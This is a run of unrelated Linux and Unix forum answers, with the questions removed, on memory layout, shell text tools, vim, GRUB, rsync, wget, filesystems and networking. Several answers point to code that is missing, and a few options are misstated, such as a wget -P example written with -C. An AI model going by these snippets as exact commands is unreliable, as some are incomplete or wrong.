you really ought not to ask two questions in one , but . . . question 1 some of that memory is used for the kernel code itself , some is reserved , etc . the kernel spits it out in the system boot messages : [ 0.000000] Memory: 6106920k/7340032k available (3633k kernel code, 1057736k absent, 175376k reserved, 3104k data, 616k init)  the " absent " line is memory that is not actually there ( this machine currently has 6gib of ram installed ) . the kernel also spits out the memory map ( this is earlier in the boot messages ) : the kernel then does various fixups to that map , usually reserving more memory . especially as the drivers load . question 2 the kernel/user split is of virtual address space , not memory . its pretty much irrelevant on a 64-bit box , because there is so much address space to go around . on a 32-bit box , virtual addresses 0x00000000–0xbfffffff were used for user address space . 0xc0000000–0xffffffff were used by the kernel ( that is the 3:1 split , other options inlcuded a 2:2 split . note those numbers are gigabytes , so it is 2:2 not 1:1 ) . virtual addresses are process-specific , too ( each process can have a page at 0x00001000 , and it is a different page ) . but a virtual address does not correspond to a byte of memory . it can be backed by basically four things : nothing . the page is not in use . try to access it , get a segfault . physical ram . the mmu translates the virtual address to some physical address , which actually corresponds to capacitors on a dimm somewhere . swap ( or memory-mapped file ) . if you access this , there will be a page fault , and the kernel will suspend your process while it reads the data into memory ( and possibly writes other data to disk , to make room ) . then the kernel updates the page tables , turning this into case #2 . zero page . this is a newly allocated page , which has not been used yet . when it is , the kernel will find a page of physical memory ( possibly swapping other stuff out ) , fill it with zeros ( for security ) , and then it is case #2 . transparent huge pages makes more cases . there are probably a few less-important ones i have forgotten , too . . . anyway , my 64-bit chip has a 48-bit virtual address size . i am not sure what split the kernel uses , but even if its half , that is 47 bits of space , well in excess of the 36-bit physical address size . and 131,072 gib of ram is too expensive . . . ( and , remember , when it gets cheaper , there are a lot of bits left in 64 , future processors will probably just allow more of them ) .
i think that what you are looking for is -T as documented in man dmesg: -t , --ctime print human readable timestamps . the timestamp could be inaccurate ! the time source used for the logs is not updated after system suspend/resume . so , for example : becomes : i found a cool trick here . the sed expression used there was wrong since it would fail when there was more than one ] in the dmesg line . i have modified it to work with all cases i found in my own dmesg output . so , this should work assuming your date behaves as expected : output looks like :
with sed , this should work : n=5 sed -ne "/\([^[:blank:]].*\)\{$n\}/!d;h;n;//!d;x;p;x;:1" -e 'p;n;b1' 
finally , i have found out a solution , just an other line ( previous not needed : wpa-ap-scan ) wpa-scan-ssid 1  i have not really found it in any documentation . . . just in a forum post .
linux mint is based on ubuntu and can use packages from the ubuntu repositories ( ncluding the many bleeding edge ppas ) . will one of the packages here work for you ? in general , to have access to both mint 's and ubuntu 's repositories , your sources list should look something like this : update : the sun java jre should be in the ubuntu partner repository . do you have this line in your sources . list ? deb http://archive.canonical.com/ubuntu/ natty partner  see here for a howto on installing jre on ubuntu ( change lucid to natty for linux mint 11 ) . i do not know if the very latest version is in the repos . are you sure you need it ? can you give an example of the kind of content you cannot load ? as an alternative you can try using alien to install from rpm . see here for a howto .
i think you can do it without having to resort to dconf-editor now . make the following changes directly to nautilus ' keyboard accelerators , located here : $ vim ~/.config/nautilus/accels  then replace this line : ; (gtk_accel_path "&lt;Actions&gt;/DirViewActions/Trash" "&lt;Primary&gt;Delete")  by this one : (gtk_accel_path "&lt;Actions&gt;/DirViewActions/Trash" "Delete")  then restart nautilus : $ nautilus -q -or- $ killall nautilus  references how can i delete a file pressing only " delete " key ? ( in gnome 3.6 ) how to restart nautilus without logging out ?
the parts of the window you pointed out are rendered by the client , i.e. the application itself . openbox themes only apply to the window decoration . in order to change the look of your applications you will have to set a gtk theme with a tool like lxappearance .
i do not use mongo but i would presume there is a way to configure its data directory , in which case your best bet might be to create a directory for it in /home and then use that instead of /data/db . you would want to do that as root , so the directory still has the correct owner . [ see the last paragraph here for more about that . . . ] another option is to use a symbolic ( aka ' soft' ) link . first : sudo mkdir -p /home/mongo/data/db  this creates the directory you are going to use within the 1.8 tb /home partition . now check what the ownership and permissions are on /data/db and make sure they are duplicated for the new directory . now move all the data from /data/db into that directory and delete the now empty inner db directory ( but not /data itself ) . next : sudo ln -s /home/mongo/data/db /data/db  this creates a soft link from /data/db to /home/mongo/data/db ; anything put into the former will actually go into the later , and likewise wrt to accessing the content ( these two paths are linked and point to the same place , which is the one in /home ) . if you have not used sym links like this before , they are a pretty handy general purpose *nix tool and very easy to understand . google and read up on them . some software , generally outward facing servers , may have ( optional ) security restrictions to do with following symlinks . i did a quick web search to check about this wrt mongo and i do not think there is a problem , but in the process i did find this comment about the data directory , lol : by default , mongod writes data to the /data/db/ directory . [ . . . ] you can specify , and create , an alternate path using the --dbpath option to mongod and the above command . from : http://docs.mongodb.org/manual/tutorial/install-mongodb-on-linux/ so there is another clue about your options ; )
got the solution in the e2fsprogs sourceforge forums . i had to put -lext2fs to the end of the line : gcc fstest.c -o fstest -lext2fs  with this command it compiles now .
upgrading like that is not really supported . instead , they recommend that you backup your data and configurations with tklbam , then create a new appliance with 13.0 and then import your old data : http://www.turnkeylinux.org/docs/appliance-upgrade
try without the -x switch . per the rsync man page -x, --one-file-system don\u2019t cross filesystem boundaries . i assume your encrypted fs is different than the root fs .
by default , wget will save to the current directory . to specify a directory , you can : use the -O parameter to specify a path/file name ( e . g . wget http://foo.bar/file -O outfile downloads and saves to outfile ) . use the -P parameter to specify a directory ( e . g . wget http://foo.bar/file -C /tmp saves to file in /tmp ) .
i think i found the problem : after a while of plugging arround different setups i replaced the sii controller with an old pci one and the problem seems to be solved .
the problem is that you are trying to install php5-dev from squeeze instead of lenny . the lenny version of php5-dev does not depend on any particular version of libtool or autoconf the way that the squeeze version does . if i were to guess how you got into this situation , i would guess that you got into this because you now or at some time had " squeeze " in your sources . list and installed some stuff , or perhaps you are referencing " stable " instead of " lenny " or " squeeze " in your sources . list and now you might be running some mix of lenny in squeeze . apt-cache policy php5-dev should tell you where you are getting php5-dev from , which might help .
if you do not need physical security , and even for a subset of physical attackers , it seems to me openbsd could do it unless there is a perfect storm of bugs and poorly chosen world-accessible services that can allow running arbitrary code in kernel mode . read up on chflags ( 1 ) . they allow keeping even root from modifying or deleting files . basically setting sappnd to your photo directory and moving securelevel ( 7 ) to -> 2 would do the job . you should secure everything else ( with special care for partitions not marked as noexec and nodev and rc scripts ) as well , but even if you messed up , the system has to be rebooted in order to remove the flags from existing photographs . combined with something like this it would be hard not to notice someone is attempting to tamper with your photos . the snapshot taking machines could be locked further as they do not even need to write to disk ( other than system logs ) .
%(!.%{\e[1;31m%}%m%{\e[0m%}.%{\e[0;33m%}%m%{\e[0m%}) that should work to change the hostname ( %m ) a different color ( red ) if you are root . i do not have a zsh shell to test it on but it looks correct . here 's why : %(x.true.false) :: based on the evaluation of first term of the ternary , execute the correct statement . ' ! ' is true if the shell is privileged . in fact %# is a shortcut for %(!.#.%) . %{\e[1;31m%} %m %{\e[0m%} :: the %{\e[X;Ym%} is the color escape sequence with x as formatting ( bold , underline , etc ) and y as the color code . note you need to open and close the sequence around the term you are looking to change the color otherwise everything after that point will be whatever color . i have added spaces here around the prompt term %m for clarity . http://www.nparikh.org/unix/prompt.php has more options and details around the color tables and other available options for zsh .
mknod /dev/ttyS1 c 4 65 ( if /dev is read-only use any writable directory mounted without the option nodev ) if the node is created without errors you can check if your patch is working reading/writing to the node or with any terminal emulator . the problem is that the node is not created ? if you are using some auto-magic dynamic dev fs like devfs or udev probably there is some registration problem in the middle ( but i think not as most of the code is the same to bring up the ttys0 and i guess adding a serial port is like adding a configuration row in an array in some platform file ) . if you are not using dev fs like that probably you have a MAKEDEV file somewhere in your build tree where to manually add a line for your new device to be created statically . i have seen also a system where the dev nodes were created by an init script .
this requires vim to have x11 clipboard integration . you can check this by doing vim --version and looking for +xterm_clipboard ( +clipboard is not it , that is for using the gui , which may actually be what you are after , the question does not specify gui or terminal ) . if you do not have +xterm_clipboard , you will need to get a version of vim that does have it ( or recompile yourself ) . if you do have it , then awesome . lets continue . x11 has 2 " clipboards " . there is the select buffer , and then the real clipboard . the select buffer is the highlight/middle_click thing . the clipboard is the normal ctrl+c/ctrl+v . to copy the current line into the selection buffer , do "*yy . ( yes , that is shift+quote shift+8 y y ) to copy into the clipboard , do "+yy . ( you can use other selection specifiers , like "+yG , or "+y in visual mode ) if you want to make one of these the default , so you can just do yy , without the "+/"* bit , you can add one of the following to your ~/.vimrc: set clipboard=unnamed  or set clipboard=unnamedplus  you did not specify if you were accessing the machine remotely , but if so you can still do this , but you will need x11 forwarding turned on and working in ssh . i will warn you however that it can cause vim to take several seconds to start up .
it is certainly possible to roll your own version of this concept with grub . however there are also tools that can make the process much easier . pendrivelinux lists several tools . of those i have had good luck with yumi , which is windows based , and multisystem which is linux-based . the multisystem project website is in french , but pendrivelinux has good instructions . i have created multi-distro usb keys with both of these with good results .
bios run bootstrap function which load mbr into memory which take mbr from first sector of first hdd . so by running grub install /dev/sdb it will not check second hdd . you need to install on grub install /dev/sda or you can set sdb as primary hdd from cmos settings , then it will only boot linux not windows . better is install grub on sda , grub is powerful boot loader . it will keep windows boot load ntldr into it which shows as " other " in boot splash screen , you can have choice to select and boot os .
ROWS="4"; montage -geometry 2550 -tile 1x$ROWS *.jpg output.jpg  geometry -> you need to know the original picture width , or at least give this a good value so the quality could be enough tile -> how many " columns x rows " will the output have ? ( from the original jpg files ) - $rows could be calculated with " ls -1 *.jpg | wc -l " if one folder contains all the jpg files . *.jpg -> input jpg files output.jpg -y the output jpg
absolutely ! from a security perspective separation is a good thing ( tm ) - as your professional and personal usage may have very different risk profiles . at work you may deal with code for clients , personal data for thousands of individuals , configuration of network devices etc . , and that usage may be regulated ( depending on your industry , employer , or clients ) at home you may be a bit more relaxed , watching videos , downloading games etc . without separation , you run risks which include : allowing a compromised executable that you pick up at home compromising your work environment . accidentally doing something in your professional environment while you think you are in your personal environment - this happens a lot , and one of the workarounds where separation of accounts is not possible is to have environments well labelled ( eg by a different prompt , or coloured background ) in reality it also makes a lot of sense to have separation of accounts used for development and production environments , so we do see this in major enterprises .
when you execute a program by typing its name ( with no directory part , e.g. just mpirun with possible arguments ) , the system looks for a file by that name in a list of directories called the program search path , or path for short . this path is determined by the environment variable PATH , which contains a colon-separated list of directories , for example /usr/local/bin:/usr/bin:/bin to look first in /usr/local/bin , then /usr/bin , then /bin . you can add directories to your search path . for example , if joe has installed some programs in his home directory /home/joe with the executables in /home/joe/bin , the following line adds /home/joe/bin at the end of the existing search path : PATH=$PATH:/home/joe/bin  in most environments , for this setting to take effect , add the line to the file called .profile in your home directory . if that file does not exist , create it . if you log in in a graphical environment , depending on your environment and distribution , .profile may not be read . in this case , look in your environment 's documentation or ask here , stating exactly what operating system , distribution and desktop environment you are running . if you log in in text mode ( e . g . over ssh ) and .profile is not read but there is a file called .bash_profile , add the line to .bash_profile .
ubuntu 10.04 lucid lynx is uses the 2.6 . x kernel and the server edition is supported until 2015-04 . you can download it here - http://releases.ubuntu.com/10.04/ for more on the differences between server editions and desktop editions of ubuntu , see this question on ask ubuntu . the main issue seems to be that there is no desktop environment included in the default installation . as such there is no gui installation , although what they give should be intuitive enough to use . you will get other packages installed which you usually get on a server too . lucid is also old enough to have a server optimised kernel , i am not sure what the exact differences are but they should me minor enough not to noticeably affect anything . it should also be ok to install the desktop edition too , it can be downloaded here - http://old-releases.ubuntu.com/releases/10.04.3/ ( get a 10.04.4 download for more included updates ) . the repositories are the same for both anyway , it is just that ' server support ' probably means that only the server relevant packages are updated . for example the server optimised kernel will probably get security updates while the desktop kernel will not .
do not use ralinks drivers as they are unneccesary . the rt5370 uses the uses the rt2800usb drivers on the kernel side , and the nl80211 drivers on the wireless side of things . if you start afresh or if you remove ralink 's drivers , when you plug in the rt5370 you should get a wlan0 interface already . if you use wpa_supplicant , specify the driver nl80211 when you are starting it , and it should work sweet . to specify the driver with wpa_supplicant , use the -Dnl80211 command line switch .
you are specifying eth0 both as an auto and an allow-hotplug device : auto eth0 allow-hotplug eth0  this is contradictory , esp . the auto device will not check whether the device is actually plugged . so you should remove the line with auto eth0 .
there are several ways to get at this information . the first that comes to mind is to use mpstat from a cronjob that would log the info to a file . a command like this would write a summary line after 24 hours . mpstat you can use various switches to mpstat to control exactly what shows up in the output . sar with sar you can have this running all the time on your system as a service . it will collect performance data which you can then extract reports from at a later date . $ sar -f /var/log/sa/sa13 1200 -s 00:00:00 -e 23:59:59  will produce a report of cpu usage from 12am ( midnight ) until 23:59:59 ( end of the day ) in 20 minute increments ( 1200 seconds = 20 min . ) . this is just an example of the type of output it will produce . you can do a lot more with sar , this is just an example .
the pc only boots from an individual disk , so that is where you must install grub . note that you can install it on each of the disks individually in case one fails , then the other can be used . grub2 also does not require a dedicated /boot partition ; it can boot from lvm on draid directly .
ok /var/www/tmp/test//./saved_images/2013-07-07 is the same as /var/www/tmp/test/saved_images/2013-07-07 . double / are ignored you can type ls //// and it is the same as ls / . the dot . is the same directory it is in . so ls /. shows the same output as ls / and so /var/www/tmp/test/. points to the directory /var/www/tmp/test/ . so rsync just takes the current directory it is in , in you case var/www/tmp/test/ ( at least when your path starts with a . ) . then its adds an extra / so it can make sure that the path it definitely has a / add the end . in the last step its adds the part you gave it , here ./saved_images/$(date +%Y-%m-%d)/$(date +%Y-%m-%d_%H-%M).jpg the error you are seeing is that the directory /var/www/tmp/test/saved_images/ is not there and rsync will not create it , because it seams that rsync only creates one directory . edit maybe for your problem you should just use a script with today_dir=$(date +%Y-%m-%d) mkdir -p ./$today_dir/ cp webcam.jpg ./$today_dir/$(date +%Y-%m-%d_%H-%M).jpg 
here is a script to print the total cpu usage for each user currently logged in , showperusercpu . sh : and here is a slightly modified version for printing the cpu usage of all available users ( but skipping the ones with a cpu usage of zero ) , showallperusercpu . sh : there is also a related script for showing the total memory usage for each user : showperusermem . sh for live-monitoring just execute these scripts periodically via the watch command .
you should have a look at the ffmpeg project . from the project description : " ffmpeg is a complete , cross-platform solution to record , convert and stream audio and video . it includes libavcodec - the leading audio/video codec library . " it is likely already installed on your system because a lot of media players depend on the libavcodec library . to see the available codecs on your system , execute ffmpeg -codecs list of codecs provided by ffmpeg list of video codecs provided by libavcodec list of audio codecs provided by libavcodec
i did not test it but as comma is equal to an and this could work : Depends: Lib (&lt;= 4), Lib (&gt;= 2) 
you can use tail to cut the last line ( the total ) from the output of du: du -c *.sql | tail -n 1  there seems to be no way to make du itself report just the total of a set of files .
you do not need two loops ; you just need to read from two files in the one loop .
awk is particularly well suited for tabular data and has a lower learning curve than some alternatives . awk : a tutorial and introduction an awk primer regularexpressions . info sed tutorial ( with links to more ) grep tutorial info sed , info grep and info awk or info gawk
busybox sed does not really support --version . as the comment indicates , the output is intended for configure scripts , not for humans . ( it is confusing to humans in a rather silly way ! ) describe it as busybox sed indicating the busybox version ( obtained with busybox | head -n 1 ) . some busybox commands have optional features , and there is no generic way to find which ones were compiled in . sed does not have any . as for why busybox sed reports that it is not gnu sed , the point is in fact that it is trying to pass off as gnu sed because it is sufficiently compatible . some configure scripts look for the string GNU sed version nnn , and this way busybox sed is acceptable . specifically , the configure script of gnu libc needed to be “ [ shot ] in the head with a bazooka full of broken glass and rusty nails” ( © rob landley ) .
i do not own a mips system , but would think so 1 -- a key requirement of android dev is the adb utility , which turns up in the debian mips distribution . that is not everything that is required , and android does not use a normal java sdk either . their site annoyingly just lists 32-bit glibc as a requirement for the " linux " version of the adt bundle ( that is everything ) , implying it was compiled for x86 machines ( it runs on 64-bit with 32-bit libs ) . however , you are in luck , because android is totally open source , including the dev tools : http://source.android.com/ there are build instructions there , etc . i think that little laptop will have its hands full -- have fun ! 1 . i believe android runs on mips devices , although of course that does not help you here .
you can use alt + u to remove the highlight on last search results . you can highlight them again with alt + u , it is a toggle . switching off the highlight does not switch off the status column , showing marks on each line containing a match , if the column is enabled using options -J or --status-column or keys - j . to hide the status column , use - + j . to show the status column , use - j . ( technically , alt + u it is equivalent to esc u on terminal level - that is why the alt -key is not mentioned in the man page . )
grep -q xfs /proc/filesystems || sudo modprobe xfs  /proc/filesystems lists all the filesystems that your kernel knows about . ( try cat /proc/filesystems to see . in the resulting list , nodev indicates that the filesystem does not expect an associated block device . ) so grep -q xfs /proc/filesystems is checking to see if your kernel knows about xfs . ( the -q means " do not print anything , just set the exit status . " ) if not , it runs sudo modprobe xfs to load the xfs module . ( the || means " run the next command only if the previous command exited non-zero , " and has nothing to do with a single | that creates a pipeline . ) sudo mkfs.xfs /dev/sdh  this creates an empty xfs filesystem on the block device /dev/sdh ( i.e. . , it formats the partition ) . you might have to install an xfs tools package ( usually called xfsprogs ) if you do not have mkfs.xfs . echo "/dev/sdh /vol xfs noatime 0 0" | sudo tee -a /etc/fstab  this appends a line to /etc/fstab so the volume will be mounted automatically during boot . the block device needs to match the one you formatted . sudo mkdir -m 000 /vol  this creates the directory where the new volume will be mounted . it could be anything you like . it is created without access permissions ( mode 000 ) so that nobody will write anything to the directory when the filesystem is not mounted . sudo mount /vol  this mounts the volume immediately , so you do not have to reboot . ( it gets the mount parameters from /etc/fstab . )
as jw13 pointed out , this is almost an exact duplicate of " ls taking long time in small directory " - at least as far as the explanation is concerned . make sure to read the comments there too ! in a nutshell , some popular command-line programs like ls can operate differently when their output does not go directly to a terminal . in this very case , ls , which is probably aliased to ls --color=auto , tries to detect the type of each directory entry for colouring purposes . at his point it hangs , unable to perform a stat operation on your sshfs-mounted directory . adding to madscientist 's answer to the mentioned question : if you are curious of how strace or gdb can help in debugging ls' behaviour , i suggest you run something like  strace -o /tmp/log ls --color=always /home/user 
make a bind mount ( use busybox mount if the built-in mount does not support the --rbind option ) mount --rbind /sdcard/shared /sdcard/whatsapp  you need to call this command on each reboot . for a permanent solution , you can also replace the directory with a soft/hard link to the target directory : mv /sdcard/whatsapp /sdcard/whatsapp_old #rename if needed ln -s /sdcard/shared /sdcard/whatsapp 
i understand your concern but the answer is " no " there is not such thing . the usual method is to ask the os the user 's home path , or get the $home variable . all these options needs always some coding from the application . a lot of applications , like bash , offer the " alias " ~ ( open ( 2 ) does not translate that ) . of course a vfs or a fuse module could be implemented to do this . probably there is something to do that , i am going to ask that ! but is it really needed ? you can use a workaround like : create an script to start the program that links the $home to a relative path or a known location . use pam_exec to link the $home dir to a known location http://www.kernel.org/pub/linux/libs/pam/linux-pam-html/sag-pam_exec.html
you will need to preserve meta-data information : cd chroot &amp;&amp; bsdtar cf - . | nice lzop | ssh user@dest ' cd chroot &amp;&amp; nice lzop -d | bsdtar --numeric-owner -xpSf -'  ( here using lzop to compress the stream to save bandwidth while being nice on the cpu ) or : rsync --verbose --archive --one-file-system \ --xattrs --hard-links --numeric-ids --sparse --acls \ chroot/ user@dest:chroot/ 
you are asking wget to do a recursive download of http://ccachicago.org , but this url does not provide any direct content . instead it is just a re-direct to http://www.ccachicago.org ( which you have not told wget to fetch recursively ) . . if you tell wget to download the correct url it will work : wget -r -e robots=off http://www.... 
when you configure a wired network using /etc/network/interfaces , you tell network manager not to touch it . there is some documentation of this in the debian wiki networkmanager article . so , to make it work , your best bet is probably to remove ( or comment out ) your configuration in /etc/network/interfaces ( except for lo ) and entirely use network manager . you will probably want to make them system connections , so they can be up before you log in . alternatively , you could set managed=true as shown in the wiki .
for starters , changing the sending mail address is not necessarily " faking " . you may simply change the address from one address that is yours to another that is also yours . but , to answer your question - neither smtp nor the message format gives you that possibility . pretty much every piece of spam mail that you get has both an envelope sender and a from:-header that has nothing to do with who actually sent the mail . some email providers , e.g. gmail , will do their best to verify that you are not using a from:-header that does not belong to you . but even when they do that , if someone else can get at your gmail account , they will also be able to send mail using those headers , even though they are not you . it is also possible to verify that the domain name in the envelope sender address matches the server from which the mail was sent , by using e.g. dkim . but it is far from universally adopted . the way to certify a sender is to use e.g. gpg to sign the message cryptographically .
mysql stores db files in /var/lib/mysql by default , but you can override this with configuration , typically stored in /etc/my.cnf , although debian uses /etc/mysql/my.cnf .
$ echo AB | perl -lpe '$_=unpack"B*"' 0100000101000010 $ echo 0100000101000010 | perl -lpe '$_=pack"B*",$_' AB  with spaces : $ echo AB | perl -lpe '$_=join " ", unpack"(B8)*"' 01000001 01000010 $ echo 01000001 01000010 | perl -lape '$_=pack"(B8)*",@F' AB  ( it assumes the input is in blocks of 8 bits ( 0-padded ) ) .
since your gene names are always in the 2nd column of the file , you can use awk for this : the same , condensed : awk '{if(NR==FNR){a[$1]++;}else{if($2 in a){print}}}' file1 file2  more condensed : awk '(NR==FNR){a[$1]++}($2 in a){print}' file1 file2  and truly minimalist ( in answer to @awk ) : awk 'NR==FNR{a[$1]}$2 in a' file1 file2 
this was due to a system which was outdated . so updating it solved the issue : emerge --update --deep --with-bdeps=y --newuse @world
systemd mountpoints support more flexible configuration of at least when to mount each point . that is sometimes useful in really complicated problems with network mounts etc . as a rule of thumb , you just use fstab unless you are stuck with configuring some complex behaviour ( if you ever do ) , then try to find systemd solution .
there are no fast and firm rules , or even common conventions . at most , there are a few options that are used consistently across some common utilities — but not across all common utilities . here are a few common letters — but remember that these are by no means universal conventions . if you have one of the features described below , it is better if you use the corresponding option . if one of the options does not make sense for your utility , feel free to use it for something else . -c COMMAND or -e COMMAND: execute a command . examples : sh -c , perl -e . -d or -D: debug . -f: force , do not ask for confirmation for dangerous actions . -h: help — but many utilities only recognize the long option --help or nothing at all . examples : linux getfacl , mount . counter-examples : gnu ls , du , df ( no short option , -h is human size ) , less ( -? is help , -h is something else ) . -i: prompt for confirmation ( i nteractive ) . -n: do not act , just print what would be done . example : make . -r or -R: recursive . -q or -s: quiet or silent . example : grep -q means display no output , grep -s means display no error message . -v: verbose . -V: show version information . traditionally lowercase letters are used , and uppercase letters only came into use because there are only 26 lowercase letters . sometimes uppercase letters have something to do with the corresponding lowercase letter ( example : gnu grep -h/-H , ssh -x/-X , cp -r/-R ) , sometimes not .
ntfs junction points are a type of reparse point , effectively acting as symbolic links but restricted to targeting local directories by absolute path . suppose you have C:\&gt;mkdir a b C:\&gt;linkd b\c C:\a  what happens is that within the directory table for C:\b , a directory entry named c is inserted , with an attribute $Reparse containing data specifying that it is a junction point with target C:\a . when windows 2000 ( when reparse points and junction points were introduced ) encounters a reparse point , it gets handed off to the appropriate handler . in this case , when accessing a path below C:\b\c , the handler for junction points would replace the path C:\b\c with C:\a and normal filesystem operations would continue from there on . other file system filters can be installed which intercept and handle other types of reparse points ; windows vista , server 2008 , and later come with a handler for " symlink " reparse points on ntfs , which can point to a file or directory , absolute or relative , local or remote - pretty much like symlinks on other systems . separately , ntfs does have support for hardlinks , in much the same manner unix does - multiple directory entries can point to the same " inode " , which is the actual file data . this has nothing to do with reparse points . on almost all systems , hard links can only be made to files ; hardlinking directories is fraught with danger . ( among other things , what should the .. entry of a hardlinked directory point to ? )
you should always use shutdown . you can add this to your ~/.bashrc file : PROMPT_COMMAND='history -a'  this will append the in-memory history to your history file after each command is completed .
vim is a modal editor . hit the esc key to get into normal ( command ) mode then type :q and press enter . to quit without saving any changes , type :q ! and press enter . see also getting out in vim documentation .
many gnome 3.6 . x apps have been ported to GMenu and as such the " menu " is only available from the main toolbar ( it changes according to the focused app ) , e.g. for empathy:
there was no solution that allowed me to fix this problem from within that system with that user . i could not get root access , and there was no trick to get around the problem . i had to ditch the server and start anew .
deb lines are relative to binary packages , that you can install with apt . deb-src lines are relative to source packages ( as downloaded by apt-get source $package ) and next compiled . source packages are needed only if you want to compile some package yourself , or inspect the source code for a bug . ordinary users do not need to include such repositories .
vim ( on most systems these days vi is actually a symlink for vim ) uses syntax files to define the coloring schemes for the various languages it can deal with . you have not specified which os you use but on my lmde system , these are found in /usr/share/vim/vim74/syntax/ . when you open a file using vim , it will first try and figure out what type of file it is . as explained in the official documentation : upon loading a file , vim finds the relevant syntax file as follows : so , basically , vim uses some tricks to parse and guess the file type and then will load the appropriate syntax file . the file that defines the syntax for configuration files is /usr/share/vim/vim74/syntax/config.vim .
first of all you need to make sure whether windows 8 can boot with secure boot disabled . if so , then supposing the system uses the uefi partition for booting , all you should need is installing elilo ( efi-enabled lilo ) , which is shipped with slackware . all it does is copying kernel to the efi boot partition . if for some reason you need to use secure boot , you either have to use the signed shim that loads grub ( which in turn loads the kernel ) or sign your kernel yourself and load the key into the uefi ( this usually is possible , but not widely used for obvious reasons ) . in any case it might be a good idea to make at least partial backup of the hdd contents ( ideally on device level ) . as for booting without cd : if you happen to have another computer at hand , booting over network is usually not too difficult to set up - you just need a basic dhcp and tftp server , e.g. dnsmasq ( which is packaged in the slackware tree ; and there is some documentation on how to do it as well ) . another option is of course taking the hdd out , putting it into a machine with dvd , installing whatever you need and putting it back . it would also make it much easier to backup the drive . back to the problem : if you already installed slackware , are just unable to boot into it yet you can boot some linux ( from usb or network , even the slackware install image ) on the machine , just do so , mount the slackware partition somewhere , bind mount the important stuff from the running linux there , chroot into it and do all the required things . basically you need something along these lines :
clean the cache for starters i would clean up my cache area . $ sudo yum clean all  testing each repo if that does not resolve the issue then i would go through and attempt to disable each repository 1 at a time and then re-run the yum list command to see if that resolves your issue . you can do this via the command line temporarily , but first you need to get the actual names of the repositories , the names of the files are not necessarily the same thing . here i am using fedora 19 , for example : enabling one repo at a time so i can see the names of my repos in the very first column . next you will want to do `yum list where you disable everything and then enable just one repo , to confirm that it is working right . when you get to the repo that is causing an issue you should get that same error you mentioned in your post .
awk 's answer may probably work , but for some reason , it is not working for me . then i found this ( a bit different ) answer by googling . download “bin” release from http://ant.apache.org/bindownload.cgi extract and copy/move the whole folder ( apache-ant-1.9xxxxx ) into /opt/ . so there will be /opt/apache-ant-1.9xxxxxx/ make a symlink : ln -s /opt/apache-ant-1.9.xxxxx /opt/ant make another symlink : ln -s /opt/ant/bin/ant /usr/bin/ant set ANT_HOME into the environment vi /etc/environment and add this line : ANT_HOME=/opt/ant ( without trailing slash ) re-login to initiate the environment . that one perfectly works for me .
serge answered it . the tlb has a fixed number of slots . if a virtual address can be mapped to a physical address with information in the tlb , you avoid an expensive page table walk . but the tlb cannot cache mappings for all pages . therefore , if you use larger pages , that fixed number of virtual to physical mappings covers a greater overall address range , increasing the hit ratio of the tlb ( which is a cached mapping ) .
thanks to nikhil 's input , i got this solved . yast only uses service names , not port numbers , when setting up xinetd . unfortunately , for some historic reasons , approx defaults to port 9999 . this is registered to another service , named " distinct " . so , the ad-hoc solution was to rename port 9999 's service to " approx " in /etc/services and enter a new service in the xinetd config with the name " approx " ( this does , as i suspected , get mapped to port 9999 ) , user approx and group approx . this is the yast-generated service file : of course , the proper solution will be to migrate the server and all client machines to a different port ( one that is not yet assigned by iana ) .
with aptitude , search for the ?obsolete pattern , possibly with a custom display format . aptitude -F '%p' search '?obsolete' 
i like snipmate pretty much , it can be used to , for example , write newconf , press Tab which expands newconf to some specified template and places the caret in one position ( and in the next ones by subsequent Tab presses ) . hart to explain , apparently this video explains it ( i guess , no plugin here ) . not sure if it is the best solution , but on the whole it is quite handy . maybe sed , patch or even Coccinelle ( "semantic patching" ) might help , too .
you may have success using /dev/stdout as the filename and piping the output of your application to gzip . /dev/stdout is a symlink to /proc/self/fd/1 . similarly , you may be able to use /dev/stdin as a filename and pipe the output of gzip to the application . i say may , because the application may be expecting a seekable file that it writes to ( reads from ) , but /dev/std{in,out} will not be seekable . if this is the case then you are probably lost . you will need to use a seekable file as the target for the application .
you can back up a vps the same way you would any other server . on the basic i would recommend copying your important files to another server , or an external hdd . this can be done with scp , nfs , rsync , or any number of other tools . if the files on your vps are changing it might be a good idea to set up the backup in a cron job . a sample command might be : scp -a all/my/files/ root@mybackupserver.com:~/backups/  if you want a more robust solution you should look into some enterprise backup solutions such as crashplan or any one of it is competitors .
what i would do is to redirect the output of wvdial to a file , and separately print out “interesting” lines from the file as they appear . wvdial &gt;wvdial.log 2&gt;&amp;1  here 's one way to filter the file . tail -n +1 -f means to follow the file as it grows ( -f ) , starting with the first line ( -n +1 ) . the filter grep -v means to display all but the matching line ; -E chooses the “modern” syntax for regular expressions . tail -n +1 -f wvdial.log | grep -vE '^--&gt; (pppd: &gt;\[7f\]|Warning)$'  there are several programs that combine the file watch feature of tail -f ( which is often called tailing a file ) with filtering and coloring capabilities ; browse the tail tag on this site and see in particular grep and tail -f ? and how to have tail -f show colored output .
to skip the first 10mb , you can use dd like that : dd if=ORIGINAL_FILE of=10MB_LESS_FILE bs=512 skip=14880  that will copy the original file to 10MB_LESS_FILE .
sudo python -m SimpleHTTPServer 80 for python 3 . x version , you may need : sudo python -m http.server 80 ports below 1024 require root privileges . as george added in a comment , running this command as root is not a good idea - it opens up all kinds of security vulnerabilities . however , it answers the question .
the zswap feature does not normally write to the swap device . it has an allocated space in the system 's memory where the pages that are in the process of being swapped are stored . so , a writing to the swap device is completely avoided . this reduces significantly the system 's i/o to the swap device as long as there is available space to store the compressed pages . it writes them back to the backing swap device in the case that the compressed pool is full .
here 's my answer from the question : aha ! i fixed it ! i took another look at the rules and marked down which number rule that reject one was . i had a hunch it was blocking the rules after it , and it was ! so , it was the following rule that was blocking my connections : 49907 7084K REJECT all -- * * 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited  so what i did to fix it , was restart the server which reset the rules , and then added my port 21 rule to be before that reject rule : then , i added the following to my vsftpd . conf : pasv_enable=YES pasv_max_port=40000 pasv_min_port=39000  now i can connect , hooray !
i just re-installed and everything works . this is clearer .
if there are no other columns with commas , this will do it : awk -F, '{c+=NF} END {print c+0}' file 
